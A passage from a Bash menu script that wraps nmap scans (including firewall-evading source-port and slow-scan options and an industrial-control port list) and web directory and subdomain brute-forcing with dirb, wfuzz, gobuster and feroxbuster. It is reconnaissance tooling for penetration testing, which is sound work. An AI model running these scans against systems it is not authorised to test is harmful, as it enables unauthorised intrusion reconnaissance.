                                if [[ $PORT != "" ]]; then
                                    PORT_OPTION="-p $PORT";
                                else
                                    PORT_OPTION="-p-";
                                fi

                                if [[ $FILENAME != "" ]]; then
                                    OUTPUT_FLAG="-oN";
                                    OUTPUT_FILE="/home/$USER/$FOLDER/$FILENAME";
                                else
                                    OUTPUT_FLAG="";
                                    OUTPUT_FILE="";
                                fi

                                echo -e "${NC}-------------------------------------------${NC}\n";
                                clear;
                                printf "${WHITE}Target: ${YELLOW}$IP\n\n";
                                printf "${WHITE}Port: ${YELLOW}$PORT\n\n";
                                printf "${WHITE}Executing command: ${YELLOW}nmap -sV -Pn -n --disable-arp-ping --source-port 53 $FLAG $PORT_OPTION ${CYAN}$IP${YELLOW} $OUTPUT_FLAG ${CYAN}$OUTPUT_FILE${YELLOW}\n\n";
                                echo -e "${NC}-------------------------------------------${NC}";

                                sudo nmap -sV -Pn -n --disable-arp-ping --source-port 53 $FLAG $PORT_OPTION $IP $OUTPUT_FLAG $OUTPUT_FILE -v;
                                printf "\n";
                                unset FILENAME;;


                            15)

                                while [[ $IP == "" ]]
                                do
                                    printf "${WHITE}"; printf "Insert Target IP Address (${YELLOW}ex: 10.10.10.1 or 10.10.10.0/24${WHITE}):\n"; printf "${NC}";
                                    read -e IP;
                                    printf "${WHITE}Target: ${YELLOW}$IP${WHITE}\n\n";
                                done

                                printf "${WHITE}"; printf "Insert Port (${YELLOW}ex: 80,443${WHITE}):\n"; printf "${NC}";
                                read -e PORT;
                                printf "${WHITE}Port: ${YELLOW}$PORT${WHITE}\n\n";

                                printf "${WHITE}"; printf "Insert FLAG:\n"; printf "${NC}";
                                read -e FLAG;
                                printf "${WHITE}Flag: ${YELLOW}$FLAG${WHITE}\n\n";

                                printf "${WHITE}"; printf "Insert File Name (leave blank for no output file):\n"; printf "${NC}";
                                read -e FILENAME;

                                if [[ $PORT != "" ]]; then
                                    PORT_OPTION="-p $PORT";
                                else
                                    PORT_OPTION="-p-";
                                fi

                                if [[ $FILENAME != "" ]]; then
                                    OUTPUT_FLAG="-oN";
                                    OUTPUT_FILE="/home/$USER/$FOLDER/$FILENAME";
                                else
                                    OUTPUT_FLAG="";
                                    OUTPUT_FILE="";
                                fi

                                echo -e "${NC}-------------------------------------------${NC}\n";
                                clear;
                                printf "${WHITE}Target: ${YELLOW}$IP\n\n";
                                printf "${WHITE}Port: ${YELLOW}$PORT\n\n";
                                printf "${WHITE}Executing command: ${YELLOW}nmap --script dns-brute $FLAG $PORT_OPTION ${CYAN}$IP${YELLOW} $OUTPUT_FLAG ${CYAN}$OUTPUT_FILE${YELLOW}\n\n";
                                echo -e "${NC}-------------------------------------------${NC}";

                                sudo nmap --script dns-brute $FLAG $PORT_OPTION $IP $OUTPUT_FLAG $OUTPUT_FILE -v;
                                printf "\n";
                                unset FILENAME;;


                        16)

                            while [[ $IP == "" || $SCRIPT == "" ]]
                            do      
                                printf "${WHITE}";printf "Insert Target IP Address (${YELLOW}ex: 10.10.10.1 or 10.10.10.0/24${WHITE}):\n";printf "${NC}";
                                read -e IP;
                                printf "${WHITE}Target: ${YELLOW}$IP${WHITE}\n\n"
                                printf "${WHITE}";printf "Insert Port (${YELLOW}ex: 80,443${WHITE}):\n";printf "${NC}";
                                read -e PORT;
                                printf "${WHITE}Port: ${YELLOW}$PORT${WHITE}\n\n"
                                printf "${WHITE}";printf "Insert FLAG:\n";printf "${NC}";
                                read -e FLAG;
                                printf "${WHITE}Flag: ${YELLOW}$FLAG${WHITE}\n\n"
                                printf "${WHITE}";printf "Insert File Name:\n";printf "${NC}";
                                read -e FILENAME;
                                printf "${WHITE}Filename: ${YELLOW}$FILENAME${WHITE}\n\n"
                                printf "${WHITE}";printf "Insert Script:\n";printf "${NC}";
                                read -e SCRIPT;
                                printf "${WHITE}Script: ${YELLOW}$SCRIPT${WHITE}\n\n"
                                echo -e "${NC}-------------------------------------------${NC}\n"        
                            done

                            if [[ $PORT != "" ]]
                            then    
                                clear;printf "${WHITE}Target: ${YELLOW}$IP\n\n";printf "${WHITE}Port: ${YELLOW}$PORT\n\n"
                                printf "${WHITE}Executing command: ${YELLOW}nmap $FLAG -sV --script ${CYAN}$SCRIPT${YELLOW} -p $PORT${YELLOW} ${CYAN}$IP${YELLOW}"
                                [[ ! -z "$FILENAME" ]] && printf " -oN ${CYAN}$FILENAME${YELLOW}"
                                printf "\n\n"
                                echo -e "${NC}-------------------------------------------${NC}"
                                sudo nmap $FLAG -sV --script $SCRIPT -p$PORT $IP $( [[ ! -z "$FILENAME" ]] && printf "-oN /home/$USER/$FOLDER/$FILENAME" ) -v
                                printf "\n"
                                unset FILENAME
                                unset SCRIPT
                            else
                                clear;printf "${WHITE}Target: ${YELLOW}$IP\n\n"
                                printf "${WHITE}Executing command: ${YELLOW}nmap $FLAG -sV --script ${CYAN}$SCRIPT${YELLOW} -p- ${CYAN}$IP${YELLOW}"
                                [[ ! -z "$FILENAME" ]] && printf " -oN ${CYAN}$FILENAME${YELLOW}"
                                printf "\n\n"
                                echo -e "${NC}-------------------------------------------${NC}"
                                sudo nmap $FLAG -sV --script $SCRIPT -p- $IP $( [[ ! -z "$FILENAME" ]] && printf "-oN /home/$USER/$FOLDER/$FILENAME" ) -v
                                printf "\n"
                                unset FILENAME
                                unset SCRIPT
                            fi;;


                        17)
                            if [[ -z "$IP" ]]; then
                                printf "${WHITE}"; printf "Insert Target IP Address (${YELLOW}ex: 10.10.10.1 or 10.10.10.0/24${WHITE}):\n"; printf "${NC}";
                                read -e IP;
                                printf "${WHITE}Target: ${YELLOW}$IP${WHITE}\n\n"
                            fi

                            printf "${WHITE}"; printf "Insert Port (${YELLOW}ex: 80,443${WHITE}):\n"; printf "${NC}";
                            read -e PORT;
                            printf "${WHITE}Port: ${YELLOW}$PORT${WHITE}\n\n"
                            printf "${WHITE}"; printf "Insert File Name (optional):\n"; printf "${NC}";
                            read -e FILENAME;
                            printf "${WHITE}Filename: ${YELLOW}$FILENAME${WHITE}\n\n"
                            printf "${WHITE}"; printf "Insert FLAG1:\n"; printf "${NC}";
                            read -e FLAG1;
                            printf "${WHITE}FLAG1: ${YELLOW}$FLAG1${WHITE}\n\n"
                            printf "${WHITE}"; printf "Insert FLAG2:\n"; printf "${NC}";
                            read -e FLAG2;
                            printf "${WHITE}FLAG2: ${YELLOW}$FLAG2${WHITE}\n\n"
                            printf "${WHITE}"; printf "Insert FLAG3:\n"; printf "${NC}";
                            read -e FLAG3;
                            printf "${WHITE}FLAG3: ${YELLOW}$FLAG3${WHITE}\n\n"
                            printf "${WHITE}"; printf "Insert FLAG4:\n"; printf "${NC}";
                            read -e FLAG4;
                            printf "${WHITE}FLAG4: ${YELLOW}$FLAG4${WHITE}\n\n"

                            echo -e "${NC}-------------------------------------------${NC}\n"

                            if [[ $PORT != "" ]]
                            then    
                                clear; printf "${WHITE}Target: ${YELLOW}$IP\n\n"; printf "${WHITE}Port: ${YELLOW}$PORT\n\n"
                                printf "${WHITE}Executing command: ${YELLOW}nmap ${CYAN}$FLAG1 $FLAG2 $FLAG3 $FLAG4${YELLOW} -p $PORT${YELLOW} ${CYAN}$IP${YELLOW}"
                                [[ ! -z "$FILENAME" ]] && printf " -oN ${CYAN}$FILENAME${YELLOW}"
                                printf " -v\n\n"
                                echo -e "${NC}-------------------------------------------${NC}"
                                sudo nmap $FLAG1 $FLAG2 $FLAG3 $FLAG4 -p$PORT $IP $( [[ ! -z "$FILENAME" ]] && printf "-oN /home/$USER/$FOLDER/$FILENAME" ) -v
                                printf "\n"
                            else
                                clear; printf "${WHITE}Target: ${YELLOW}$IP\n\n"
                                printf "${WHITE}Executing command: ${YELLOW}nmap ${CYAN}$FLAG1 $FLAG2 $FLAG3 $FLAG4${YELLOW} -p- ${CYAN}$IP${YELLOW}"
                                [[ ! -z "$FILENAME" ]] && printf " -oN ${CYAN}$FILENAME${YELLOW}"
                                printf " -v \n\n"
                                echo -e "${NC}-------------------------------------------${NC}"
                                sudo nmap $FLAG1 $FLAG2 $FLAG3 $FLAG4 -p- $IP $( [[ ! -z "$FILENAME" ]] && printf "-oN /home/$USER/$FOLDER/$FILENAME" ) -v
                                printf "\n"
                            fi;;
                                
                        18)
                                while [[ $IP == "" ]]
                                do
                                    printf "${WHITE}"; printf "Insert Target IP Address (${YELLOW}ex: 10.10.10.1 or 10.10.10.0/24${WHITE}):\n"; printf "${NC}";
                                    read -e IP;
                                    printf "${WHITE}Target: ${YELLOW}$IP${WHITE}\n\n";
                                done

                                printf "${WHITE}"; printf "Insert Port (${YELLOW}ex: 80,443${WHITE}):\n"; printf "${NC}";
                                read -e PORT;
                                printf "${WHITE}Port: ${YELLOW}$PORT${WHITE}\n\n";

                                printf "${WHITE}"; printf "Insert FLAG:\n"; printf "${NC}";
                                read -e FLAG;
                                printf "${WHITE}Flag: ${YELLOW}$FLAG${WHITE}\n\n";

                                printf "${WHITE}"; printf "Insert File Name (leave blank for no output file):\n"; printf "${NC}";
                                read -e FILENAME;

                                if [[ $PORT = "" ]]; then
                                    PORT_OPTION="-p 20,21,22,23,25,53,80,102,161,139,179,123,443,445,500,502,530,593,789,1089-1091,1911,1962,2323,3389,2404,4000,4840,4843,4911,9600,19999,20000,20547,34962-34964,34980,44818,46823,46824,55000-55003";
                                else
                                    PORT_OPTION="-p $PORT";
                                fi

                                if [[ $FILENAME != "" ]]; then
                                    OUTPUT_FLAG="-oN";
                                    OUTPUT_FILE="/home/$USER/$FOLDER/$FILENAME";
                                else
                                    OUTPUT_FLAG="";
                                    OUTPUT_FILE="";
                                fi

                                echo -e "${NC}-------------------------------------------${NC}\n";
                                clear;
                                printf "${WHITE}Target: ${YELLOW}$IP\n\n";
                                printf "${WHITE}Port: ${YELLOW}$PORT\n\n";
                                printf "${WHITE}Executing command: ${YELLOW}nmap --sT --scan-delay 2s $FLAG $PORT_OPTION ${CYAN}$IP${YELLOW} $OUTPUT_FLAG ${CYAN}$OUTPUT_FILE${YELLOW}\n\n";
                                echo -e "${NC}-------------------------------------------${NC}";

                                sudo nmap -sT --scan-delay 2s $FLAG $PORT_OPTION $IP $OUTPUT_FLAG $OUTPUT_FILE -v;
                                printf "\n";
                                unset FILENAME;;


                        19)
                            printf "${WHITE}";printf "Insert Script Name(${YELLOW}ex: smb${WHITE}):\n";printf "${NC}";
                            read -e  SCRIPT;clear;
                            locate *.nse | grep $SCRIPT;printf "\n";unset SCRIPT;;


                        20)
                            clear;
                            printf "${WHITE}Target: ${YELLOW}$IP${WHITE}\n\n";printf "${WHITE}Port: ${YELLOW}$PORT${WHITE}\n\n";printf "${WHITE}FileName: ${YELLOW}$FILENAME${WHITE}\n\n";printf "${WHITE}Script: ${YELLOW}$SCRIPT${WHITE}\n\n";printf "${WHITE}Flags: ${YELLOW}$FLAG1 $FLAG2 $FLAG3 $FLAG4 $FLAG${WHITE}\n\n";
                            echo -e "${NC}-------------------------------------------${NC}\n";;                                             

                        21)
                            clear; 
                            printf "${WHITE}Insert Target IP:\n${NC}"
                            read -e  IP;printf "\n"
                            printf "${WHITE}Insert Target Port:\n${NC}"
                            read -e  PORT;printf "\n"
                            printf "${WHITE}Insert FileName:\n${NC}"
                            read -e  FILENAME;printf "\n"
                            printf "${WHITE}Insert Script:\n${NC}"
                            read -e  SCRIPT;printf "\n"
                            clear;
                            printf "${WHITE}Target: ${YELLOW}$IP${WHITE}\n\n"
                            printf "${WHITE}Port: ${YELLOW}$PORT${WHITE}\n\n"
                            printf "${WHITE}FileName: ${YELLOW}$FILENAME${WHITE}\n\n"
                            printf "${WHITE}Script: ${YELLOW}$SCRIPT${WHITE}\n\n"
                            echo -e "${NC}-------------------------------------------${NC}\n";;                                             

                        22)
                            clear;
                            printf "Values Cleared!\n\n"
                            echo -e "${NC}-------------------------------------------${NC}\n"
                            unset IP
                            unset FILENAME;
                            unset PORTG
                            unset SCRIPT
                            unset FLAG1
                            unset FLAG2
                            unset FLAG3
                            unset FLAG4
                            unset FLAG;;

                        0)
                            clear;
                            break;;

                        esac
                done;;

#fuzz
            3)        
                while : ; do

                    printf "${WHITE}Select A Tool:${NC}\n\n"
                    echo -e "${CYAN}1. Dirb ${NC}"
                    echo -e "${CYAN}2. Wfuzz${NC}"
                    echo -e "${CYAN}3. GoBuster ${NC}"
                    echo -e "${CYAN}4. DirHunt ${NC}"
                    echo -e "${CYAN}5. FeroxBuster${NC}"
                    echo -e "${CYAN}6. FFuF${NC}"
                    echo -e "${GREEN}7. Show Values ${NC}"
                    echo -e "${GREEN}8. Set Values ${NC}"
                    echo -e "${GREEN}9. Clear Values ${NC}"
                    echo -e "${YELLOW}0. Back ${NC}\n"
                    echo -n -e "${RED}Enter selection [0-9]: ${NC}"
                    printf ${WHITE};
                    read -e  -r fuzz;
                    printf "\n";clear;

#dirb
                case $fuzz in

                    1)
                        while [[ $IP == "" ]]
                        do
                                printf "${WHITE}Insert Target IP:\n${NC}" 
                                read -e  IP;
                                printf "${WHITE}Target: ${YELLOW}$IP${WHITE}\n\n"
                                printf "${WHITE}Insert WordList:\n${NC}"
                                read -e  WORDLIST;
                                printf "${WHITE}Wordlist: ${YELLOW}$IP${WHITE}\n\n"
                                echo -e "${NC}-------------------------------------------${NC}\n"

                        done

                        if [[ $WORDLIST == "" ]]
                        then

                                printf "${WHITE}Target: ${YELLOW}$IP${WHITE}\n\nWordList: ${YELLOW}$WORDLIST${WHITE}\n\n" 
                                printf "${WHITE}Executing command: ${YELLOW}dirb ${PURPLE}$IP${YELLOW}\n\n" 
                                echo -e "${NC}-------------------------------------------${NC}\n"
                                dirb $IP  
                                printf "\n"
                        else
                                clear;
                                printf "${WHITE}Target: ${YELLOW}$IP${WHITE}\n\nWordList: ${YELLOW}$WORDLIST${WHITE}\n\n" 
                                printf "${WHITE}Executing command: ${YELLOW}dirb ${PURPLE}$IP${YELLOW} ${PURPLE}$WORDLIST${YELLOW}\n\n" 
                                echo -e "${NC}-------------------------------------------${NC}\n"
                                dirb $IP $WORDLIST
                                unset WORDLIST;
                                printf "\n" 
                        fi;;

#wfuzz
                    2)

                        while : ; do

                            printf "${WHITE}Select An Option:${NC}\n\n"
                            echo -e "${CYAN}1. Directory Brute Force ${NC}"
                            echo -e "${CYAN}2. Sub-Domain Brute Force${NC}"
                            echo -e "${GREEN}3. Show Values  ${NC}"
                            echo -e "${GREEN}4. Set Values ${NC}"
                            echo -e "${GREEN}5. Clear Values ${NC}"
                            echo -e "${YELLOW}0. Back ${NC}\n"
                            echo -n -e "${RED}Enter selection [0-5]: ${NC}"
                            printf ${WHITE};
                            read -e  -r wfuzzz;
                            printf "\n";clear;

                            case $wfuzzz in

                                1)  
                                    while [[ $IP == "" ]]
                                    do  
                                        printf "${WHITE}Insert Target IP:\n${NC}"
                                        read -e IP;
                                        printf "${WHITE}Target: ${YELLOW}$IP${WHITE}\n\n"
                                    done
                                    while [[ $WORDLIST == "" ]]
                                    do
                                        printf "${WHITE}Insert WordList:\n"${NC}
                                        read -e WORDLIST;
                                        printf "${WHITE}WordList: ${YELLOW}$WORDLIST${WHITE}\n\n"
                                    done
                                        printf "${WHITE}Insert Response Code (${YELLOW}ex: 200,202,204,301,302,307,403,500${WHITE}) [optional]:\n"${NC}
                                        read -e RESPONSECODE;
                                        printf "${WHITE}Response Code: ${YELLOW}$RESPONSECODE${WHITE}\n\n"
                                        echo -e "${NC}-------------------------------------------${NC}\n"


                                    printf "${WHITE}Target: ${YELLOW}$IP${WHITE}\n\nWordList: ${YELLOW}$WORDLIST${WHITE}\n\n"
                                    if [[ -n $RESPONSECODE ]]; then
                                        printf "Response Code: ${YELLOW}$RESPONSECODE${WHITE}\n\n"
                                    fi

                                    printf "${WHITE}Executing command: ${YELLOW}wfuzz -c -z file,${PURPLE}$WORDLIST${YELLOW}"
                                    if [[ -n $RESPONSECODE ]]; then
                                        printf " --sc ${PURPLE}$RESPONSECODE${YELLOW}"
                                    fi
                                    printf " ${PURPLE}$IP/FUZZ${YELLOW} \n\n" 
                                    echo -e "${NC}-------------------------------------------${NC}\n"
                                    wfuzz -c -z file,$WORDLIST $( [[ -n $RESPONSECODE ]] && printf "--sc $RESPONSECODE" ) $IP/FUZZ
                                    unset WORDLIST
                                    unset RESPONSECODE;   
                                    printf "\n\n";;



                                2) 
                                    while [[ $IP == "" ]]
                                    do  
                                        printf "${WHITE}Insert Target IP:\n${NC}"
                                        read -e IP;
                                        printf "${WHITE}Target: ${YELLOW}$IP${WHITE}\n\n"
                                    done
                                    while [[ $WORDLIST == "" ]]
                                    do
                                        printf "${WHITE}Insert WordList:\n"${NC}
                                        read -e WORDLIST;
                                        printf "${WHITE}WordList: ${YELLOW}$WORDLIST${WHITE}\n\n"
                                    done
                                        printf "${WHITE}Insert Response Code (${YELLOW}ex: 200,202,204,301,302,307,403,500${WHITE}) [optional]:\n"${NC}
                                        read -e RESPONSECODE;
                                        printf "${WHITE}Response Code: ${YELLOW}$RESPONSECODE${WHITE}\n\n"
                                    while [[ $DOMAINHOST == "" ]]
                                    do
                                        printf "${WHITE}Insert Domain:\n"${NC}
                                        read -e DOMAINHOST;
                                        printf "${WHITE}WordList: ${YELLOW}$WORDLIST${WHITE}\n\n"
                                    done


                                    printf "${WHITE}Target: ${YELLOW}$IP${WHITE}\n\nWordList: ${YELLOW}$WORDLIST${WHITE}\n\nDomain: ${YELLOW}$DOMAINHOST${WHITE}\n\n"
                                    if [[ -n $RESPONSECODE ]]; then
                                        printf "Response Code: ${YELLOW}$RESPONSECODE${WHITE}\n\n"
                                    fi

                                    printf "${WHITE}Executing command: ${YELLOW}wfuzz -H Host: FUZZ.${PURPLE}$DOMAINHOST${YELLOW} -w $WORDLIST${YELLOW}"
                                    if [[ -n $RESPONSECODE ]]; then
                                        printf " --sc ${PURPLE}$RESPONSECODE${YELLOW}"
                                    fi
                                    printf " ${PURPLE}$IP${YELLOW} \n\n" 
                                    echo -e "${NC}-------------------------------------------${NC}\n"
                                    wfuzz -H "Host: FUZZ.$DOMAINHOST" -w $WORDLIST $IP $( [[ -n $RESPONSECODE ]] && printf "--sc $RESPONSECODE" )
                                    unset WORDLIST
                                    unset RESPONSECODE
                                    unset DOMAINHOST;   
                                    printf "\n\n";;


                                3)
                                    clear;
                                    printf "${WHITE}Target: ${YELLOW}$IP${WHITE}\n\n";printf "${WHITE}WordList: ${YELLOW}$WORDLIST${WHITE}\n\n";printf "${WHITE}Response Code: ${YELLOW}$RESPONSECODE${WHITE}\n\n";printf "${WHITE}Host Domain: ${YELLOW}$DOMAINHOST${WHITE}\n\n"
                                    echo -e "${NC}-------------------------------------------${NC}\n";;

                                4)
                                    clear;
                                    while [[ $IP == "" || $WORDLIST == "" || $RESPONSECODE == "" ]]
                                    do  
                                            printf "${WHITE}Insert Target IP:\n${NC}"
                                            read -e  IP;printf "\n"
                                            printf "${WHITE}Insert WordList:\n${NC}"
                                            read -e  WORDLIST;printf "\n"
                                            printf "${WHITE}Insert Response Code:\n${NC}"
                                            read -e  RESPONSECODE;printf "\n"
                                            printf "${WHITE}Insert Host Domain:\n${NC}"
                                            read -e  DOMAINHOST;printf "\n"
                                            clear;
                                    done
                                            printf "${WHITE}Target: ${YELLOW}$IP${WHITE}\n\n";printf "${WHITE}WordList: ${YELLOW}$WORDLIST${WHITE}\n\n";printf "${WHITE}Response Code: ${YELLOW}$RESPONSECODE${WHITE}\n\n";printf "${WHITE}Host Domain: ${YELLOW}$DOMAINHOST${WHITE}\n\n";
                                            echo -e "${NC}-------------------------------------------${NC}\n";;


                                5)
                                    clear;
                                    printf "Values Cleared!\n\n"
                                    echo -e "${NC}-------------------------------------------${NC}\n"
                                    unset IP;unset WORDLIST; unset RESPONSECODE; unset DOMAINHOST;;

                                0)
                                    clear;
                                    break;;
                        
                            esac         
                        
                        done;;
#gobuster           
                    3) 

                        while : ; do

                            printf "${WHITE}Select An Option:${NC}\n\n"
                            echo -e "${CYAN}1. Directory Brute Force ${NC}"
                            echo -e "${CYAN}2. Directory Brute Force With Extension ${NC}"
                            echo -e "${CYAN}3. VHost Brute Force${NC}"
                            echo -e "${CYAN}4. DNS Brute-force  ${NC}"
                            echo -e "${GREEN}5. Show Values ${NC}"
                            echo -e "${GREEN}6. Set Values ${NC}"
                            echo -e "${GREEN}7. Clear Values ${NC}"
                            echo -e "${YELLOW}0. Back ${NC}\n"
                            echo -n -e "${RED}Enter selection [0-7]: ${NC}"
                            printf ${WHITE};
                            read -e  -r gobust;
                            printf "\n";clear;

                            case $gobust in

                                1)
                                    clear
                                    while [[  $IP == "" ]]
                                    do 

                                            printf "${WHITE}Insert Target IP:\n${NC}"
                                            read -e  IP;
                                            printf "${WHITE}Target: ${YELLOW}$IP${WHITE}\n\n"
                                    done
                                    while [[ $WORDLIST == "" ]]
                                    do
                                        printf "${WHITE}Insert WordList:\n"${NC}
                                        read -e WORDLIST;
                                        printf "${WHITE}WordList: ${YELLOW}$WORDLIST${WHITE}\n\n"
                                    done
                                            echo -e "${NC}-------------------------------------------${NC}\n"
                                            printf "\n"
                      
                                            printf "${WHITE}Target: ${YELLOW}$IP${WHITE}\n\nWordList: ${YELLOW}$WORDLIST${WHITE} \n\n" 
                                            printf "${WHITE}Executing command: ${YELLOW}gobuster dir -u ${PURPLE}$IP${YELLOW} -w ${PURPLE}$WORDLIST${YELLOW} ${YELLOW}--no-tls-validation ${YELLOW}--wildcard${WHITE} switch\n\n" 
                                            echo -e "${NC}-------------------------------------------${NC}\n"
                                            gobuster dir -u $IP -w $WORDLIST --no-tls-validation --wildcard switch
                                            unset WORDLIST;     
                                            printf "\n\n";;

                                2)
                                    clear;


                                    while [[  $IP == "" ]]
                                    do 
                                            printf "${WHITE}Insert Target IP:\n${NC}"
                                            read -e  IP;
                                            printf "${WHITE}Target: ${YELLOW}$IP${WHITE}\n\n"
                                    done
                                    while [[ $WORDLIST == "" ]]
                                    do
                                        printf "${WHITE}Insert WordList:\n"${NC}
                                        read -e WORDLIST;
                                        printf "${WHITE}WordList: ${YELLOW}$WORDLIST${WHITE}\n\n"
                                    done
                                    while [[ $EXTENSION == "" ]]
                                    do
                                            printf "${WHITE}Insert Extension (${YELLOW}ex: txt,html,php,css,js,sh,py,cgi,db${WHITE}):\n"${NC}
                                            read -e  EXTENSION;
                                            printf "${WHITE}Extension: ${YELLOW}$EXTENSION${WHITE}\n\n"
                                    done

                                            echo -e "${NC}-------------------------------------------${NC}\n"
                                            printf "${WHITE}Target: ${YELLOW}$IP${WHITE}\n\nWordList: ${YELLOW}$WORDLIST${WHITE}\n\nExtension: ${YELLOW}$EXTENSION${WHITE}\n" 
                                            printf "${WHITE}Executing command: ${YELLOW}gobuster dir -u ${PURPLE}$IP${YELLOW} -w ${PURPLE}$WORDLIST${YELLOW} -x ${PURPLE}$EXTENSION${YELLOW} ${YELLOW}--no-tls-validation ${YELLOW}--wildcard${WHITE} switch \n\n" 
                                            echo -e "${NC}-------------------------------------------${NC}\n"
                                            gobuster dir -u $IP -w $WORDLIST -x $EXTENSION --no-tls-validation --wildcard switch
                                            unset WORDLIST;
                                            unset EXTENSION;
                                            printf "\n\n";;

                                3)
                                    clear;
                                    while [[  $IP == "" ]]
                                    do 

                                            printf "${WHITE}Insert Target IP:\n${NC}"
                                            read -e  IP;
                                            printf "${WHITE}Target: ${YELLOW}$IP${WHITE}\n\n"
                                    done
                                    while [[ $WORDLIST == "" ]]
                                    do
                                        printf "${WHITE}Insert WordList:\n"${NC}
                                        read -e WORDLIST;
                                        printf "${WHITE}WordList: ${YELLOW}$WORDLIST${WHITE}\n\n"
                                    done
                                            echo -e "${NC}-------------------------------------------${NC}\n"
                                            printf "${WHITE}Target: ${YELLOW}$IP${WHITE}\n\nWordList: ${YELLOW}$WORDLIST${WHITE}\n\n" 
                                            printf "${WHITE}Executing command: ${YELLOW}gobuster vhost -w ${PURPLE}$WORDLIST${YELLOW} -u ${PURPLE}$IP${YELLOW} ${YELLOW}--no-tls-validation ${YELLOW}--wildcard${WHITE} switch\n\n" 
                                            echo -e "${NC}-------------------------------------------${NC}\n"
                                            gobuster vhost -w $WORDLIST -u $IP --no-tls-validation --wildcard switch
                                            unset WORDLIST;
                                            printf "\n\n";;

                                4)
                                    while [[  $IP == "" ]]
                                    do 

                                            printf "${WHITE}Insert Target IP:\n${NC}"
                                            read -e  IP;
                                            printf "${WHITE}Target: ${YELLOW}$IP${WHITE}\n\n"
                                    done
                                    while [[ $WORDLIST == "" ]]
                                    do
                                        printf "${WHITE}Insert WordList:\n"${NC}
                                        read -e WORDLIST;
                                        printf "${WHITE}WordList: ${YELLOW}$WORDLIST${WHITE}\n\n"
                                    done
                                    while [[ $DOMAINHOST == "" ]]
                                    do
                                            printf "${WHITE}Insert Domain (${YELLOW}ex: domain.local${WHITE}):\n"${NC}
                                            read -e  DOMAINHOST;
                                            printf "${WHITE}Domain: ${YELLOW}$DOMAINHOST${WHITE}\n\n"
                                    done
                                            echo -e "${NC}-------------------------------------------${NC}\n"
                                            printf "${WHITE}Target: ${YELLOW}$IP${WHITE}\n\nWordList: ${YELLOW}$WORDLIST${WHITE}\n\nDomain: ${YELLOW}$DOMAINHOST${WHITE} \n\n" 
                                            printf "${WHITE}Executing command: ${YELLOW}gobuster dns -d ${PURPLE}$DOMAINHOST${YELLOW} -w ${PURPLE}$WORDLIST${YELLOW} ${YELLOW}--no-tls-validation ${YELLOW}--wildcard${WHITE} switch \n\n" 
                                            echo -e "${NC}-------------------------------------------${NC}\n"
                                            gobuster dns -d $DOMAINHOST -w $WORDLIST --no-tls-validation --wildcard switch
                                            unset WORDLIST
                                            unset DOMAINHOST
                                            printf "\n\n";;


                                5)
                                    clear;
                                    printf "${WHITE}Target: ${YELLOW}$IP${WHITE}\n\n";printf "${WHITE}WordList: ${YELLOW}$WORDLIST${WHITE}\n\n";printf "${WHITE}Extension: ${YELLOW}$EXTENSION${WHITE}\n\n";printf "${WHITE}Host Domain: ${YELLOW}$DOMAINHOST${WHITE}\n\n"
                                    echo -e "${NC}-------------------------------------------${NC}\n";;

                                6)
                                    clear;

                                    while [[ $IP == "" || $WORDLIST == "" ]]
                                    do  
                                            printf "${WHITE}Insert Target IP:\n${NC}"
                                            read -e  IP;printf "\n"
                                            printf "${WHITE}Insert WordList:\n${NC}"
                                            read -e  WORDLIST;printf "\n"
                                            printf "${WHITE}Insert Domain Host:\n${NC}"
                                            read -e  DOMAINHOST;printf "\n"
                                            printf "${WHITE}Insert Extension(${YELLOW}ex: txt,html,php,css,js,sh,py,cgi,db${WHITE}):\n${NC}"
                                            read -e  EXTENSION;printf "\n"
                                            clear;
                                    done
                                            printf "${WHITE}Target: ${YELLOW}$IP${WHITE}\n\n";printf "${WHITE}WordList: ${YELLOW}$WORDLIST${WHITE}\n\n";printf "${WHITE}Extension: ${YELLOW}$EXTENSION${WHITE}\n\n";printf "${WHITE}Host Domain: ${YELLOW}$DOMAINHOST${WHITE}\n\n"
                                            echo -e "${NC}-------------------------------------------${NC}\n";;


                                7)
                                    clear;
                                    printf "Values Cleared!\n\n"
                                    echo -e "${NC}-------------------------------------------${NC}\n"
                                    unset IP;unset WORDLIST; unset EXTENSION; unset DOMAINHOST;;

                                0)
                                    clear;
                                    break;;

                            esac  
                        done;;   

                    4)
                        while [[  $IP == "" ]] 
                        do 
#dirhunt
                                printf "${WHITE}Insert Target IP:\n${NC}"
                                read -e  IP;
                                printf "${WHITE}Target: ${YELLOW}$IP${WHITE}\n\n"
                                echo -e "${NC}-------------------------------------------${NC}\n"
                        done
                                printf "${WHITE}Target: ${YELLOW}$IP${WHITE}\n\n" 
                                printf "${WHITE}Executing command: ${YELLOW}sudo dirhunt ${PURPLE}$IP${YELLOW}\n\n" 
                                echo -e "${NC}-------------------------------------------${NC}\n"
                                sudo dirhunt $IP
                                printf "\n\n";; 
#feroxbuster
                    5)
                        while [[ $IP == "" ]]
                        do
                                printf "${WHITE}Insert Target IP:\n${NC}"
                                read -e  IP;printf "\n";
                                printf "${WHITE}Target: ${YELLOW}$IP${WHITE}\n\n"
                                printf "${WHITE}Insert WordList:\n${NC}"
                                read -e  WORDLIST;printf "\n";
                                printf "${WHITE}Wordlist: ${YELLOW}$WORDLIST${WHITE}\n\n"
                                echo -e "${NC}-------------------------------------------${NC}\n"

                        done

                        if [[ $WORDLIST == "" ]]
                        then
                                printf "${WHITE}Target: ${YELLOW}$IP${WHITE}\n\nWordList: ${YELLOW}$WORDLIST${WHITE}\n\n" 
                                printf "${WHITE}Executing command: ${YELLOW}feroxbuster -u ${PURPLE}$IP${YELLOW} -k\n\n" 
                                echo -e "${NC}-------------------------------------------${NC}\n"
                                feroxbuster -u $IP -k
                                printf "\n"
                        else
                                printf "${WHITE}Target: ${YELLOW}$IP${WHITE}\n\nWordList: ${YELLOW}$WORDLIST${WHITE}\n\n" 
                                printf "${WHITE}Executing command: ${YELLOW}feroxbuster -u ${PURPLE}$IP${YELLOW} -w ${PURPLE}$WORDLIST${YELLOW} -k\n\n" 
                                echo -e "${NC}-------------------------------------------${NC}\n"
                                feroxbuster -u $IP -w $WORDLIST -k
                                printf "\n"
                        fi;;  

                    6)
                        while : ; do

                            printf "${WHITE}Select An Option:${NC}\n\n"
                            echo -e "${CYAN}1. Directory Brute Force ${NC}"
                            echo -e "${CYAN}2. Directory Brute Force With Recursion${NC}"
                            echo -e "${CYAN}3. Sub-Domain Brute Force${NC}"
                            echo -e "${GREEN}4. Show Values  ${NC}"
                            echo -e "${GREEN}5. Set Values ${NC}"
                            echo -e "${GREEN}6. Clear Values ${NC}"
                            echo -e "${YELLOW}0. Back ${NC}\n"
                            echo -n -e "${RED}Enter selection [0-6]: ${NC}"
                            printf ${WHITE};
                            read -e  -r fffuf;
                            printf "\n";clear;

